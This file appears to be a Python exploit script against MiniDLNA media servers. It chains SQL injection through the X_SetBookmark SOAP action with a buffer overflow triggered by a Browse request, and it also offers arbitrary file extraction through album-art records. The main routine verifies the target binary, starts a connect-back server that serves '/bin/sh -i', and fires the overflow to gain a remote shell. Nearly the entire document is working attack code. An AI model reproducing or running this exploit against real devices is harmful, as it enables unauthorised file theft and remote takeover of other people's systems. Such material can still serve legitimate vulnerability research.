#!/usr/bin/env python

import sys
import time
import getopt
from dlna_overflow import DLNA_Overflow
from minidlna_verification import MinidlnaVerifier
from bowcaster.common.support import Logging
from bowcaster.clients import HttpClient,HTTPError
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.common.support import pretty_string

class SoapRequestXSetBookmark(object):
    SOAP_HEADERS={"HOST":"127.0.0.1",
                  "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#X_SetBookmark"',
                  "CONTENT-TYPE":'text/xml;charset="utf-8"'
                  }
    PATH="/ctl/ContentDir"
    
    INJECT_START='1);'
    INJECT_END=";--"
    
    def __init__(self,target_ip,inject_string=None,port=8200,logger=None):
        if not logger:
            self.logger=Logging()
        self.target_ip=target_ip
        self.port=port
        
        self.request_xml=open("./soap_x_setbookmark.xml","rb").read()
        if inject_string:
            request=self.request_xml.replace("INJECT",inject_string);
            self.request_xml=request
    
    def send_request(self,request=None):
        logger=self.logger
        if not request:
            logger.LOG_DEBUG("Request was none. Setting to self.request_xml")
            request=self.request_xml
        else:
            logger.LOG_DEBUG("Using request passed as parameter.")
            
        cls=self.__class__
        url="http://%s:%s%s" % (self.target_ip,self.port,cls.PATH)
        client=HttpClient()
        #logger.LOG_DEBUG("Sending SOAP request:\n%s" % request)

        resp=client.send(url,post_data=request,headers=cls.SOAP_HEADERS)
        return resp

class SoapSetBookmarkClearAlbumArt(SoapRequestXSetBookmark):
    DELETE_ALBUM_ART=('DELETE from ALBUM_ART where ID=%s')
    
    def __init__(self,target_ip,port=8200,albumart_id="31337",logger=None):
        cls=self.__class__
        if not logger:
            logger=Logging()
        self.logger=logger
        logger.LOG_DEBUG("Creating SOAP request to delete id %s from ALBUM_ART." % albumart_id)
        inject_details=cls.DELETE_ALBUM_ART % albumart_id
        inject_string=cls.INJECT_START+inject_details+cls.INJECT_END
        logger.LOG_DEBUG("Injection string:\n\t%s" % inject_string)
        super(cls,self).__init__(target_ip,port=port,inject_string=inject_string,logger=logger)

class SoapSetBookmarkAlbumArtFileExtract(SoapRequestXSetBookmark):
    INSERT_ALBUM_ART=('INSERT into ALBUM_ART(ID,PATH) VALUES(%s,"%s")')
    
    def __init__(self,target_ip,path,port=8200,albumart_id="31337",logger=None):
        cls=self.__class__
        if not logger:
            print("%s: creating logger" % cls.__name__)
            logger=Logging()
        self.logger=logger
            
        logger.LOG_INFO("path to extract: %s" % path)
        logger.LOG_INFO("Album art id: %s" % albumart_id)
        
        inject_details=cls.INSERT_ALBUM_ART % (albumart_id,path)
        inject_string=cls.INJECT_START
        inject_string+=inject_details
        inject_string+=cls.INJECT_END
        logger.LOG_DEBUG("Injection string:\n\t%s" % inject_string)
        self.extraction_url="http://%s:%d/AlbumArt/%s-1.jpg" % (target_ip,port,albumart_id)
        
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string,logger=logger)

class SoapSetBookmarkStageDetails(SoapRequestXSetBookmark):
    #MIME has to start with a 'v' presumably for video,
    #Naturally 'v' is for 'vendetta'
    INSERT_DETAILS=('INSERT into DETAILS(ID,SIZE,TITLE,ARTIST,TRACK,DLNA_PN,MIME,ALBUM_ART,DISC) ' +
                        'VALUES(%s,"PWNED","PWNED","PWNED","PWNED","%s","vendetta","PWNED","PWNED")')

    DLNA_PN="AVC_TS_MP_SD_AC3"
    
    def __init__(self,target_ip,port=8200,detail_id="31337",logger=None):
        cls=self.__class__
        inject_details=cls.INSERT_DETAILS % (detail_id,cls.DLNA_PN)
        self.logger=logger
        inject_string=cls.INJECT_START
        inject_string+=inject_details
        inject_string+=cls.INJECT_END
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string,logger=logger)

class SoapSetBookmarkStageObjects(SoapRequestXSetBookmark):
    INSERT_OBJECTS=('INSERT into OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID) ' +
                    'VALUES("PWNED","PWNED","item.audioItem.musicTrack",%s)')
    
    def __init__(self,target_ip,port=8200,detail_id="31337",logger=None):
        cls=self.__class__
        self.logger=logger
        inject_objects=cls.INSERT_OBJECTS % detail_id;
        inject_string=cls.INJECT_START+inject_objects+cls.INJECT_END
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=inject_string,logger=logger)


class SoapSetBookmarkAppendDLNA_PN(SoapRequestXSetBookmark):
    APPEND_DLNA_PN=('UPDATE DETAILS set DLNA_PN=DLNA_PN||"%s" where ID=%s')
    
    #for using when we need to insert a single quote
    #appended string will be literally: '''' which will be condensed by
    #sqlite to: '
    APPEND_DLNA_PN_NOQUOTES=('UPDATE DETAILS set DLNA_PN=DLNA_PN||%s where ID=%s')
    
    def __init__(self,target_ip,overflow_string,port=8200,detail_id="31337",logger=None):
        #TODO: break overflow string into parts to separate out single quotes
        if not logger:
            logger=Logging()
        self.logger=logger
        cls=self.__class__
        inject_strings=[]
        parts=self.make_parts(overflow_string)
        
        logger.LOG_DEBUG("split overflow string into %d parts." % (len(parts)))
        for part in parts:
            if part=="''":
                append=cls.APPEND_DLNA_PN_NOQUOTES % (part,detail_id)
            else:
                append=cls.APPEND_DLNA_PN % (part,detail_id)
            
            inject_string=cls.INJECT_START+append+cls.INJECT_END
            inject_strings.append(inject_string)
            
        self.inject_strings=inject_strings
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=None,logger=logger)
    
    def make_parts(self,string):
        parts=string.split("'")
        if len(parts) < 2:
            return parts
        
        newparts=[]
    
    
        for i in range(0,len(parts)):
            string=parts[i]
            if len(string)>0:
                newparts.append(string)
            if i != (len(parts)-1):
                newparts.append("''")
            
        return newparts
          
    def send_all_requests(self):
        for inject_string in self.inject_strings:
            self.logger.LOG_DEBUG("Inject string: %s" % inject_string)
            request=self.request_xml.replace("INJECT",inject_string);
            self.send_request(request=request)

        

class SoapSetBookmarkDelete(SoapRequestXSetBookmark):
    DELETE_DETAILS=" DELETE from DETAILS where ID=%s"
    DELETE_OBJECTS=" DELETE from OBJECTS where DETAIL_ID=%s"
    
    def __init__(self,target_ip,port=8200,detail_id="31337",logger=None):
        cls=self.__class__
        self.logger=logger
        self.inject_delete_details=(cls.INJECT_START +
                                    cls.DELETE_DETAILS % (detail_id) +
                                    cls.INJECT_END)
                                    
        self.inject_delete_objects=(cls.INJECT_START + 
                                    cls.DELETE_OBJECTS % (detail_id) +
                                    cls.INJECT_END)
        
        super(self.__class__,self).__init__(target_ip,port=port,inject_string=None,logger=logger)
        
    def send_all_requests(self):
        request=self.request_xml.replace("INJECT",self.inject_delete_details)
        self.send_request(request=request)
        
        request=self.request_xml.replace("INJECT",self.inject_delete_objects)
        self.send_request(request=request)
        

class BrowseExploit(object):
    PATH="/ctl/ContentDir"
    SOAP_HEADERS={"Host":"127.0.0.1",
                    "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                    "content-type":'text/xml ;charset="utf-8"',
                    #BRAVIA gets special munging of DLNA_PN
                    "X-AV-Client-Info":"BRAVIA",
                    "connection":"close"}
                    
    def __init__(self,target_ip,port=8200,object_id="PWNED"):
        self.target_ip=target_ip
        self.port=port
        self.object_id=object_id
        
        request_xml=open("./browse_request.xml","rb").read()
        self.request_xml=request_xml.replace("EXPLOIT_OBJECT_ID",object_id)

    def send_request(self):
        request=self.request_xml
        cls=self.__class__
        url="http://%s:%s%s" % (self.target_ip,self.port,cls.PATH)
        client=HttpClient()

        resp=client.send(url,post_data=request,headers=cls.SOAP_HEADERS)
        return resp

def chunks(string, n):
    return [ string[x:x+n] for x in range(0, len(string), n)]

def albumart_extract(host,path,port=8200,outfile=None,logger=None):
    if not logger:
        logger=Logging
    logger.LOG_DEBUG("Got outfile : %s" % outfile)
    logger.LOG_DEBUG("Removing old album art record.")
    request_object=SoapSetBookmarkClearAlbumArt(host,logger=logger)
    resp=request_object.send_request()
    logger.LOG_DEBUG("response: %s" % str(resp))
    
    request_object=SoapSetBookmarkAlbumArtFileExtract(host,path,logger=logger)
    resp=request_object.send_request()
    logger.LOG_DEBUG("response: %s" % str(resp))
    
    client=HttpClient()
    url=request_object.extraction_url
    resp=client.send(url)
    logger.LOG_INFO("Got response. %d bytes." % len(resp))
    
    if outfile:
        logger.LOG_INFO("Writing response to %s." % outfile)
        open(outfile,"wb").write(resp)

    return resp

def do_verification(host,port=8200,logger=None):
    if not logger:
        logger=Logging()
    data=albumart_extract(host,"/usr/sbin/minidlna.exe",logger=logger)
    verifier=MinidlnaVerifier(data)
    logger.LOG_INFO("MD5 of minidlna binary: %s" % verifier.hexdigest)
    if verifier.versions:
        logger.LOG_INFO("\tFirmware version: %s\n\tminidlna version: %s" % (verifier.versions[0],verifier.versions[1]))
        return True
    else:
        logger.LOG_WARN("Minidlna binary did not match known hash.")
        return False

def do_overflow(host,overflow,port=8200,logger=None):
    if not logger:
        logger=Logging()
    request_object=SoapSetBookmarkDelete(host,port=port,logger=logger)
    request_object.send_all_requests()
    
    request_object=SoapSetBookmarkStageDetails(host,port=port,logger=logger)
    request_object.send_request()
    
    request_object=SoapSetBookmarkStageObjects(host,port=port,logger=logger)
    request_object.send_request()
    
    overflow=str(overflow)
    
    logger.LOG_DEBUG("Overflow string: %s" % overflow)
    request_object=SoapSetBookmarkAppendDLNA_PN(host,overflow,port=port)
    request_object.send_all_requests()

    logger.LOG_INFO("Browsing exploit.")

    request_object=BrowseExploit(host)
    resp=request_object.send_request()


def main(options,logger=None):
    outfile=None
    path=None
    connectback_ip=None
    port=None
    host=None
    
    
    
    if not logger:
        logger=Logging()

    try:
        port=options["port"]
    except KeyError:
        port=8200

    try:
        connectback_ip=options["connectback_ip"]
    except KeyError:
        pass

    try:
        host=options["target"]
    except KeyError:
        pass
        
    try:
        path=options["extract"]
    except KeyError:
        pass

    
    if path:
        try:
            outfile=options["outfile"]
            host=options["target"]
            logger.LOG_DEBUG("main() got path=%s" % path)
            albumart_extract(host,path,outfile=outfile,logger=logger)
            exit(0)
        except KeyError:
            print("File extraction requires a remote path, local file, and target IP address.")
            usage(1)

    
    if connectback_ip:
        buf=DLNA_Overflow(1536,connectback_ip,logger=logger).buf    

        try:
            find_str=options["find_string"]
            logger.LOG_INFO("Finding offset of %s" % find_str)
            find=find_str
            if find_str.startswith("0x"):
                find=int(find_str,16)
    
            offset=buf.find_offset(find)
            logger.LOG_INFO("Offset: %s" % offset)
            exit(0)
        except KeyError:
            pass
        if not host:
            print("Remote exploitation requires a target IP address.")
            usage(1)
    else:
        print("No file extraction, overflow search string, or remote target was provided.")
        usage(1)


    
    if not do_verification(host,port=port,logger=logger):
        exit(1)
    

    server=ConnectbackServer(connectback_ip,startcmd="/bin/sh -i")
    server.serve()
    try:
        do_overflow(host,buf,port=port,logger=logger)
    except Exception as e:
        server.shutdown()
        raise e
    server.wait()
#    logger.LOG_DEBUG(resp)

def usage(exit_status):
    print "Usage: %s [OPTIONS]\n" % sys.argv[0]
    print "Option summary:"
    print "-t, --target=IP_ADDRESS          Remote target to exploit."
    print "                                 This option is mutually exclusive with -f."
    print "-p,--port=PORT                   Port to connect to."
    print "                                 This option requires -t."
    print "                                 This option is mutually exclusive with -f."
    print "-c,--connectback_ip=IP_ADDRESS   Connect-back IP address."
    print "                                 This option is mutually exclusive with -e."
    print "-e,--extract=FILE                Full path to a file on the target to extract."
    print "                                 This option requires -F."
    print "                                 This option is mutually exclusive with -c and -f"
    print "                                 because no buffer overflow string will be generated."
    print "-F,--file=FILE                   Local file to save extracted file to."
    print "                                 This option requires -e."
    print "                                 This option is mutually exclusive with -c and -f."
    print "-f,--find_offset=FIND_STRING     String whose offset in the overflow buffer"
    print "                                 to find and report."
    print "                                 This option requires -c."
    print "                                 This option is mutually exclusive with -e."
    print "                                 This option is mutually exclusive with -t"
    print "                                 because the buffer overflow will not be sent to the target."
    sys.exit(exit_status)

def parse_options(argv,logger=None):
    if not logger:
        logger=Logging()
    opts,args=getopt.getopt(argv[1:],'ht:p:c:e:f:F:',["help","target=","port=","connectback_ip=","extract=","find_offset=","file="])
    options={}
    for o, a in opts:
        if o in("-h","--help"):
            usage(0)
        if o in ("-t","--target"):
            logger.LOG_DEBUG("got target: %s" % a)
            if options.has_key("find_string"):
                print("Cannot specify remote target with -f.")
                usage(1)
            options["target"]=a
        elif o in ("-p","--port"):
            logger.LOG_DEBUG("Got port: %s" % a)
            if options.has_key("find_string"):
                print("Cannot specify remote port with -f.")
                usage(1)
            options["port"]=int(port)
        elif o in ("-c","--connectback_ip"):
            logger.LOG_DEBUG("got connect-back IP: %s" % a)
            if options.has_key("extract"):
                print("Cannot specify connect-back IP with -e.")
                usage(1)
            options["connectback_ip"]=a
        elif o in ("-e","--extract"):
            logger.LOG_DEBUG("got extract: %s" % a)
            if options.has_key("connectback_ip") or options.has_key("find_offset"):
                print("Cannot specify extraction with -f or -c.")
                usage(1)
            options["extract"]=a
        elif o in ("-F","--file"):
            logger.LOG_DEBUG("Got outfile: %s" % a)
            if options.has_key("connectback_ip") or options.has_key("find_offset"):
                print("Cannot specify extraction with -f or -c.")
                usage(1)
            options["outfile"]=a
        elif o in ("-f","--find_offset"):
            logger.LOG_DEBUG("got find value: %s" % a)
            if options.has_key("extract") or options.has_key("target"):
                print("Cannot specify -f with -t or -e.")
                usage(1)
            options["find_string"]=a
        else:
            logger.LOG_WARN("Got unknown option: %s" % o)
            usage(1)
    return options
    

if __name__ == "__main__":
    logger=Logging(max_level=Logging.DEBUG)
    options=parse_options(sys.argv,logger=logger)
    main(options,logger=logger)
